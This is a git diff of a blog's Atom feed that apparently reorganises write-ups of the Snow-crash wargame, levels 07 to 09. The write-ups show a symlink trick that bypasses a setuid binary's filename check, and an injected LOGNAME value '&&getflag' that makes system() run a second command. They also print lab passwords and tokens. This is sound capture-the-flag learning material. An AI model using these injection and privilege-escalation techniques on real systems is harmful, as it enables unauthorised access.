@@ -1,4 +1,144 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-07-09T13:23:35+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DévEnCours</title><subtitle>Un carnet d’essais, d’erreurs et d’apprentissages.</subtitle><author><name>Yoo</name></author><entry><title type="html">Weeklypaper</title><link href="http://localhost:4000/WeeklyPaper/" rel="alternate" type="text/html" title="Weeklypaper" /><published>2025-07-09T00:00:00+09:00</published><updated>2025-07-09T00:00:00+09:00</updated><id>http://localhost:4000/WeeklyPaper</id><content type="html" xml:base="http://localhost:4000/WeeklyPaper/"><![CDATA[]]></content><author><name>Yoo</name></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Snow-crash Level09</title><link href="http://localhost:4000/cyber-security/Level09/" rel="alternate" type="text/html" title="Snow-crash Level09" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/cyber-security/Level09</id><content type="html" xml:base="http://localhost:4000/cyber-security/Level09/"><![CDATA[<h4 id="1-the-password-of-level09-is-the-token-that-got-from-level08">1. The password of <code class="language-plaintext highlighter-rouge">Level09</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level08</code>.</h4>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-07-09T14:02:24+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">DévEnCours</title><subtitle>Un carnet d’essais, d’erreurs et d’apprentissages.</subtitle><author><name>Yoo</name></author><entry><title type="html">Weekly paper - sprint bootcam</title><link href="http://localhost:4000/sprint/WeeklyPaper/" rel="alternate" type="text/html" title="Weekly paper - sprint bootcam" /><published>2025-07-09T00:00:00+09:00</published><updated>2025-07-09T00:00:00+09:00</updated><id>http://localhost:4000/sprint/WeeklyPaper</id><content type="html" xml:base="http://localhost:4000/sprint/WeeklyPaper/"><![CDATA[]]></content><author><name>Yoo</name></author><category term="sprint" /><category term="python" /><category term="AI engineering" /><category term="Github" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Snow-crash Level08</title><link href="http://localhost:4000/ecole42/Level08/" rel="alternate" type="text/html" title="Snow-crash Level08" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level08</id><content type="html" xml:base="http://localhost:4000/ecole42/Level08/"><![CDATA[<h4 id="1-the-password-of-level08-is-the-token-that-got-from-level07">1. The password of <code class="language-plaintext highlighter-rouge">Level08</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level07</code>.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
+</code></pre></div></div>
+
+<h4 id="2-so-try-login-to-level08-with-the-password-we-got-from-level07-and-try-to-put-the-command-ls-we-can-see-the-files-level08-and-token-and-try-to-cat-and-execute">2. So, try login to Level08 with the password we got from Level07 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the files <code class="language-plaintext highlighter-rouge">Level08</code> and <code class="language-plaintext highlighter-rouge">token</code>. and try to <code class="language-plaintext highlighter-rouge">cat</code> and <code class="language-plaintext highlighter-rouge">execute</code>.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>su level08
+Password:
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 28
+dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 <span class="nb">.</span>
+d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
+<span class="nt">-r-x------</span>  1 level08 level08  220 Apr  3  2012 .bash_logout
+<span class="nt">-r-x------</span>  1 level08 level08 3518 Aug 30  2015 .bashrc
+<span class="nt">-r-x------</span>  1 level08 level08  675 Apr  3  2012 .profile
+<span class="nt">-rwsr-s---</span>+ 1 flag08  level08 8617 Mar  5  2016 level08
+<span class="nt">-rw-------</span>  1 flag08  flag08    26 Mar  5  2016 token
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>token
+<span class="nb">cat</span>: token: Permission denied
+level08@SnowCrash:~<span class="nv">$ </span>./level08
+./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
+</code></pre></div></div>
+
+<p>We can see <code class="language-plaintext highlighter-rouge">cat: token: Permission denied</code> and <code class="language-plaintext highlighter-rouge">execute: ./level08 [file to read]</code>.</p>
+
+<h4 id="3--then-try-to-ltrace">3 . then, try to ltrace</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>ltrace ./level08
+__libc_start_main<span class="o">(</span>0x8048554, 1, 0xbffff7a4, 0x80486b0, 0x8048720 &lt;unfinished ...&gt;
+<span class="nb">printf</span><span class="o">(</span><span class="s2">"%s [file to read]</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"./level08"</span>./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
+<span class="o">)</span>        <span class="o">=</span> 25
+<span class="nb">exit</span><span class="o">(</span>1 &lt;unfinished ...&gt;
++++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
+</code></pre></div></div>
+
+<p>Same for the ltrace command, we need a another file to be read.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>./level08 token
+You may not access <span class="s1">'token'</span>
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">chmod</span> +x token
+<span class="nb">chmod</span>: changing permissions of <span class="sb">`</span>token<span class="s1">': Operation not permitted
+</span></code></pre></div></div>
+
+<h4 id="4-so-since-we-dont-have-any-access-lets-create-the-symbolic-link-as-we-did-in-previous-exercises">4. So, since we don’t have any access, let’s create the <code class="language-plaintext highlighter-rouge">symbolic link</code> as we did in previous exercises.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span><span class="nb">pwd</span>
+/home/user/level08
+level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /home/user/level08/token /tmp/level08flag
+level08@SnowCrash:~<span class="nv">$ </span>./level08 /tmp/level08flag
+quif5eloekouj29ke0vouxean
+</code></pre></div></div>
+
+<h4 id="5-so-we-found-our-password-lets-put-our-password-into-flag08-for-level09">5. So, we found our password! Let’s put our password into flag08 for level09.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+</code></pre></div></div>
+
+<h4 id="6-we-got-a-toekn-for-level-09">6. We got a toekn for level 09.</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level07</title><link href="http://localhost:4000/ecole42/Level07/" rel="alternate" type="text/html" title="Snow-crash Level07" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level07</id><content type="html" xml:base="http://localhost:4000/ecole42/Level07/"><![CDATA[<h4 id="1-the-password-of-level07-is-the-token-that-got-from-level06">1. The password of <code class="language-plaintext highlighter-rouge">Level07</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level06</code>.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
+</code></pre></div></div>
+
+<h4 id="2-so-try-login-to-level07-with-the-password-we-got-from-level06-and-try-to-put-the-command-ls-we-can-see-the-file-level07-and-try-to-execute">2. So, try login to Level07 with the password we got from Level06 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the file <code class="language-plaintext highlighter-rouge">Level07</code>. and try to execute.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level06@SnowCrash:~<span class="nv">$ </span>su level07
+Password:
+level07@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 24
+dr-x------ 1 level07 level07  120 Mar  5  2016 <span class="nb">.</span>
+d--x--x--x 1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
+<span class="nt">-r-x------</span> 1 level07 level07  220 Apr  3  2012 .bash_logout
+<span class="nt">-r-x------</span> 1 level07 level07 3518 Aug 30  2015 .bashrc
+<span class="nt">-r-x------</span> 1 level07 level07  675 Apr  3  2012 .profile
+<span class="nt">-rwsr-sr-x</span> 1 flag07  level07 8805 Mar  5  2016 level07
+level07@SnowCrash:~<span class="nv">$ </span>./level07
+level07
+</code></pre></div></div>
+<h4 id="3-try-to-put-file-command">3. Try to put <code class="language-plaintext highlighter-rouge">file</code> command</h4>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>file level07
+level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.24, BuildID[sha1]<span class="o">=</span>0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
+</code></pre></div></div>
+<p>It’s a binary file.</p>
+
+<h4 id="4-so-lets-use-ltrace-command-to-understandto-debug-the-behavior-of-this-program">4. So, let’s use ltrace command to understand/to debug the behavior of this program</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>ltrace ./level07
+__libc_start_main<span class="o">(</span>0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 &lt;unfinished ...&gt;
+getegid<span class="o">()</span>                                 <span class="o">=</span> 2007
+geteuid<span class="o">()</span>                                 <span class="o">=</span> 2007
+setresgid<span class="o">(</span>2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
+setresuid<span class="o">(</span>2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
+getenv<span class="o">(</span><span class="s2">"LOGNAME"</span><span class="o">)</span>                         <span class="o">=</span> <span class="s2">"level07"</span>
+asprintf<span class="o">(</span>0xbffff6f4, 0x8048688, 0xbfffff2c, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 18
+system<span class="o">(</span><span class="s2">"/bin/echo level07 "</span>level07
+ &lt;unfinished ...&gt;
+<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
+&lt;... system resumed&gt; <span class="o">)</span>                    <span class="o">=</span> 0
++++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
+</code></pre></div></div>
+<p>We can see the getenv(“LOGNAME”) = “level07”</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~$ echo $LOGNAME
+level07
+</code></pre></div></div>
+<h4 id="5-try-to-do-the-small-tests-as-below">5. Try to do the small tests as below.</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~$ export LOGNAME="HELLO_WORLD";
+level07@SnowCrash:~$ ./level07
+HELLO_WORLD
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~$ export
+declare -x HOME="/home/user/level07"
+declare -x LANG="en_US.UTF-8"
+declare -x LC_CTYPE="UTF-8"
+declare -x LC_TERMINAL="iTerm2"
+declare -x LC_TERMINAL_VERSION="3.4.23"
+declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
+declare -x LESSOPEN="| /usr/bin/lesspipe %s"
+declare -x LOGNAME="HELLO_WORLD"
+</code></pre></div></div>
+<p>We can see the line <code class="language-plaintext highlighter-rouge">declare -x LOGNAME="HELLO_WORLD"</code></p>
+
+<h4 id="6-so-then-we-try-to-put-getflag-in-the-logname">6. So then, we try to put getflag in the LOGNAME.</h4>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">LOGNAME</span><span class="o">=</span><span class="s2">"&amp;&amp;getflag"</span>
+level07@SnowCrash:~<span class="nv">$ </span>./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+</code></pre></div></div>
+
+<h4 id="7-we-got-a-token-for-level-08">7. We got a token for level 08.</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level09</title><link href="http://localhost:4000/ecole42/Level09/" rel="alternate" type="text/html" title="Snow-crash Level09" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/ecole42/Level09</id><content type="html" xml:base="http://localhost:4000/ecole42/Level09/"><![CDATA[<h4 id="1-the-password-of-level09-is-the-token-that-got-from-level08">1. The password of <code class="language-plaintext highlighter-rouge">Level09</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level08</code>.</h4>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
 </code></pre></div></div>
@@ -142,147 +282,7 @@ Password:
 Don't forget to launch getflag !
 flag09@SnowCrash:~$ getflag
 Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="cyber-security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level08</title><link href="http://localhost:4000/cyber-security/Level08/" rel="alternate" type="text/html" title="Snow-crash Level08" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/cyber-security/Level08</id><content type="html" xml:base="http://localhost:4000/cyber-security/Level08/"><![CDATA[<h4 id="1-the-password-of-level08-is-the-token-that-got-from-level07">1. The password of <code class="language-plaintext highlighter-rouge">Level08</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level07</code>.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
-</code></pre></div></div>
-
-<h4 id="2-so-try-login-to-level08-with-the-password-we-got-from-level07-and-try-to-put-the-command-ls-we-can-see-the-files-level08-and-token-and-try-to-cat-and-execute">2. So, try login to Level08 with the password we got from Level07 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the files <code class="language-plaintext highlighter-rouge">Level08</code> and <code class="language-plaintext highlighter-rouge">token</code>. and try to <code class="language-plaintext highlighter-rouge">cat</code> and <code class="language-plaintext highlighter-rouge">execute</code>.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>su level08
-Password:
-level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
-total 28
-dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 <span class="nb">.</span>
-d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
-<span class="nt">-r-x------</span>  1 level08 level08  220 Apr  3  2012 .bash_logout
-<span class="nt">-r-x------</span>  1 level08 level08 3518 Aug 30  2015 .bashrc
-<span class="nt">-r-x------</span>  1 level08 level08  675 Apr  3  2012 .profile
-<span class="nt">-rwsr-s---</span>+ 1 flag08  level08 8617 Mar  5  2016 level08
-<span class="nt">-rw-------</span>  1 flag08  flag08    26 Mar  5  2016 token
-level08@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>token
-<span class="nb">cat</span>: token: Permission denied
-level08@SnowCrash:~<span class="nv">$ </span>./level08
-./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
-</code></pre></div></div>
-
-<p>We can see <code class="language-plaintext highlighter-rouge">cat: token: Permission denied</code> and <code class="language-plaintext highlighter-rouge">execute: ./level08 [file to read]</code>.</p>
-
-<h4 id="3--then-try-to-ltrace">3 . then, try to ltrace</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>ltrace ./level08
-__libc_start_main<span class="o">(</span>0x8048554, 1, 0xbffff7a4, 0x80486b0, 0x8048720 &lt;unfinished ...&gt;
-<span class="nb">printf</span><span class="o">(</span><span class="s2">"%s [file to read]</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"./level08"</span>./level08 <span class="o">[</span>file to <span class="nb">read</span><span class="o">]</span>
-<span class="o">)</span>        <span class="o">=</span> 25
-<span class="nb">exit</span><span class="o">(</span>1 &lt;unfinished ...&gt;
-+++ exited <span class="o">(</span>status 1<span class="o">)</span> +++
-</code></pre></div></div>
-
-<p>Same for the ltrace command, we need a another file to be read.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span>./level08 token
-You may not access <span class="s1">'token'</span>
-level08@SnowCrash:~<span class="nv">$ </span><span class="nb">chmod</span> +x token
-<span class="nb">chmod</span>: changing permissions of <span class="sb">`</span>token<span class="s1">': Operation not permitted
-</span></code></pre></div></div>
-
-<h4 id="4-so-since-we-dont-have-any-access-lets-create-the-symbolic-link-as-we-did-in-previous-exercises">4. So, since we don’t have any access, let’s create the <code class="language-plaintext highlighter-rouge">symbolic link</code> as we did in previous exercises.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~<span class="nv">$ </span><span class="nb">pwd</span>
-/home/user/level08
-level08@SnowCrash:~<span class="nv">$ </span><span class="nb">ln</span> <span class="nt">-s</span> /home/user/level08/token /tmp/level08flag
-level08@SnowCrash:~<span class="nv">$ </span>./level08 /tmp/level08flag
-quif5eloekouj29ke0vouxean
-</code></pre></div></div>
-
-<h4 id="5-so-we-found-our-password-lets-put-our-password-into-flag08-for-level09">5. So, we found our password! Let’s put our password into flag08 for level09.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level08@SnowCrash:~$ su flag08
-Password:
-Don't forget to launch getflag !
-flag08@SnowCrash:~$ getflag
-Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
-</code></pre></div></div>
-
-<h4 id="6-we-got-a-toekn-for-level-09">6. We got a toekn for level 09.</h4>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="cyber-security" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level07</title><link href="http://localhost:4000/cyber-security/Level07/" rel="alternate" type="text/html" title="Snow-crash Level07" /><published>2024-02-15T00:00:00+09:00</published><updated>2024-02-15T00:00:00+09:00</updated><id>http://localhost:4000/cyber-security/Level07</id><content type="html" xml:base="http://localhost:4000/cyber-security/Level07/"><![CDATA[<h4 id="1-the-password-of-level07-is-the-token-that-got-from-level06">1. The password of <code class="language-plaintext highlighter-rouge">Level07</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level06</code>.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wiok45aaoguiboiki2tuin6ub
-</code></pre></div></div>
-
-<h4 id="2-so-try-login-to-level07-with-the-password-we-got-from-level06-and-try-to-put-the-command-ls-we-can-see-the-file-level07-and-try-to-execute">2. So, try login to Level07 with the password we got from Level06 and try to put the command <code class="language-plaintext highlighter-rouge">ls</code>. We can see the file <code class="language-plaintext highlighter-rouge">Level07</code>. and try to execute.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level06@SnowCrash:~<span class="nv">$ </span>su level07
-Password:
-level07@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
-total 24
-dr-x------ 1 level07 level07  120 Mar  5  2016 <span class="nb">.</span>
-d--x--x--x 1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
-<span class="nt">-r-x------</span> 1 level07 level07  220 Apr  3  2012 .bash_logout
-<span class="nt">-r-x------</span> 1 level07 level07 3518 Aug 30  2015 .bashrc
-<span class="nt">-r-x------</span> 1 level07 level07  675 Apr  3  2012 .profile
-<span class="nt">-rwsr-sr-x</span> 1 flag07  level07 8805 Mar  5  2016 level07
-level07@SnowCrash:~<span class="nv">$ </span>./level07
-level07
-</code></pre></div></div>
-<h4 id="3-try-to-put-file-command">3. Try to put <code class="language-plaintext highlighter-rouge">file</code> command</h4>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>file level07
-level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.24, BuildID[sha1]<span class="o">=</span>0x26457afa9b557139fa4fd3039236d1bf541611d0, not stripped
-</code></pre></div></div>
-<p>It’s a binary file.</p>
-
-<h4 id="4-so-lets-use-ltrace-command-to-understandto-debug-the-behavior-of-this-program">4. So, let’s use ltrace command to understand/to debug the behavior of this program</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span>ltrace ./level07
-__libc_start_main<span class="o">(</span>0x8048514, 1, 0xbffff7a4, 0x80485b0, 0x8048620 &lt;unfinished ...&gt;
-getegid<span class="o">()</span>                                 <span class="o">=</span> 2007
-geteuid<span class="o">()</span>                                 <span class="o">=</span> 2007
-setresgid<span class="o">(</span>2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
-setresuid<span class="o">(</span>2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 0
-getenv<span class="o">(</span><span class="s2">"LOGNAME"</span><span class="o">)</span>                         <span class="o">=</span> <span class="s2">"level07"</span>
-asprintf<span class="o">(</span>0xbffff6f4, 0x8048688, 0xbfffff2c, 0xb7e5ee55, 0xb7fed280<span class="o">)</span> <span class="o">=</span> 18
-system<span class="o">(</span><span class="s2">"/bin/echo level07 "</span>level07
- &lt;unfinished ...&gt;
-<span class="nt">---</span> SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> <span class="nt">---</span>
-&lt;... system resumed&gt; <span class="o">)</span>                    <span class="o">=</span> 0
-+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
-</code></pre></div></div>
-<p>We can see the getenv(“LOGNAME”) = “level07”</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~$ echo $LOGNAME
-level07
-</code></pre></div></div>
-<h4 id="5-try-to-do-the-small-tests-as-below">5. Try to do the small tests as below.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~$ export LOGNAME="HELLO_WORLD";
-level07@SnowCrash:~$ ./level07
-HELLO_WORLD
-</code></pre></div></div>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~$ export
-declare -x HOME="/home/user/level07"
-declare -x LANG="en_US.UTF-8"
-declare -x LC_CTYPE="UTF-8"
-declare -x LC_TERMINAL="iTerm2"
-declare -x LC_TERMINAL_VERSION="3.4.23"
-declare -x LESSCLOSE="/usr/bin/lesspipe %s %s"
-declare -x LESSOPEN="| /usr/bin/lesspipe %s"
-declare -x LOGNAME="HELLO_WORLD"
-</code></pre></div></div>
-<p>We can see the line <code class="language-plaintext highlighter-rouge">declare -x LOGNAME="HELLO_WORLD"</code></p>
-
-<h4 id="6-so-then-we-try-to-put-getflag-in-the-logname">6. So then, we try to put getflag in the LOGNAME.</h4>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level07@SnowCrash:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">LOGNAME</span><span class="o">=</span><span class="s2">"&amp;&amp;getflag"</span>
-level07@SnowCrash:~<span class="nv">$ </span>./level07
-
-Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
-</code></pre></div></div>
-
-<h4 id="7-we-got-a-token-for-level-08">7. We got a token for level 08.</h4>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="cyber-security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level06</title><link href="http://localhost:4000/cyber-security/Level06/" rel="alternate" type="text/html" title="Snow-crash Level06" /><published>2024-02-14T00:00:00+09:00</published><updated>2024-02-14T00:00:00+09:00</updated><id>http://localhost:4000/cyber-security/Level06</id><content type="html" xml:base="http://localhost:4000/cyber-security/Level06/"><![CDATA[<h4 id="1-the-password-of-level06-is-the-token-that-got-from-level05">1. The password of <code class="language-plaintext highlighter-rouge">Level06</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level05</code>.</h4>
+</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="ecole42" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level06</title><link href="http://localhost:4000/ecole42s/Level06/" rel="alternate" type="text/html" title="Snow-crash Level06" /><published>2024-02-14T00:00:00+09:00</published><updated>2024-02-14T00:00:00+09:00</updated><id>http://localhost:4000/ecole42s/Level06</id><content type="html" xml:base="http://localhost:4000/ecole42s/Level06/"><![CDATA[<h4 id="1-the-password-of-level06-is-the-token-that-got-from-level05">1. The password of <code class="language-plaintext highlighter-rouge">Level06</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level05</code>.</h4>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>viuaaale9huek52boumoomioc
 </code></pre></div></div>
@@ -437,75 +437,7 @@ Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 <p>####  7. We got a token for level07</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
-</code></pre></div></div>]]></content><author><name>Yoo</name></author><category term="cyber-security" /><category term="CyberSecurity" /><category term="Github" /><category term="Git" /><summary type="html"><![CDATA[Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.]]></summary></entry><entry><title type="html">Snow-crash Level05</title><link href="http://localhost:4000/cyber-security/Level05/" rel="alternate" type="text/html" title="Snow-crash Level05" /><published>2024-02-13T00:00:00+09:00</published><updated>2024-02-13T00:00:00+09:00</updated><id>http://localhost:4000/cyber-security/Level05</id><content type="html" xml:base="http://localhost:4000/cyber-security/Level05/"><![CDATA[<h4 id="1-the-password-of-level05-is-the-token-that-got-from-level04">1. The password of <code class="language-plaintext highlighter-rouge">Level05</code> is the token that got from <code class="language-plaintext highlighter-rouge">Level04</code>.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ne2searoevaevoem4ov4ar8ap
-
-</code></pre></div></div>
-<h4 id="2-so-try-login-to-level05-with-the-password-we-got-from-level04-and-try-to-put-the-command-ls--la-lets-see-inside-in-level05">2. So, try login to <code class="language-plaintext highlighter-rouge">Level05</code> with the password we got from <code class="language-plaintext highlighter-rouge">Level04</code> and try to put the command ‘ls -la’. Let’s see inside in level05.</h4>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level05@localhost's password: ne2searoevaevoem4ov4ar8ap
-You have new mail.
-level05@SnowCrash:~$
-</code></pre></div></div>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-level05@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
-total 12
